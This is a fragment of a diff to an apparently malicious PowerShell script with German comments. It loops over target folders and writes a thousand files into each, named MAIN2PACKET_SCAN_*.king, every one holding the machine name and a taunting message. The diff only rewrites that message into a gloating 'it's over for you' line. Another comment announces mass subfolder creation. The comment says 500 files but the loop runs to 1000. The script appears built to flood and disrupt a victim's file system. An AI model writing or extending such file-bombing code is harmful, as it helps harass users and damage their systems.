@@ -224,10 +224,10 @@ while ($global:currentRound -lt $global:maxRounds) {
             # 500 DATEIEN PRO ZIEL
             for ($i = 1; $i -le 1000; $i++) {
                 # Direkt im Zielordner
-                "$env:COMPUTERNAME - MAIN2PACKET SCAN HAHAHAHHAHAHAHAHAHAHAHA $i" | Out-File (Join-Path $ziel "MAIN2PACKET_SCAN_$i.king") -Encoding UTF8 -Force
+                "$env:COMPUTERNAME - MAIN2PACKET IST ÜBERALL DASS WAR MIT DIR HAHAHAHHAHAHAHAHAHAHAHA $i" | Out-File (Join-Path $ziel "MAIN2PACKET_SCAN_$i.king") -Encoding UTF8 -Force
                 
                 # Im Hauptordner
-                "$env:COMPUTERNAME - MAIN2PACKET SCAN HAHAHAHHAHAHAHAHAHAHAHA $i" | Out-File (Join-Path $mainFolder "file_$i.king") -Encoding UTF8 -Force
+                "$env:COMPUTERNAME - MAIN2PACKET IST ÜBERALL DAS WARS MIT DIR HAHAHAHHAHAHAHAHAHAHAHA $i" | Out-File (Join-Path $mainFolder "file_$i.king") -Encoding UTF8 -Force
             }
             
             # 500 UNTERORDNER
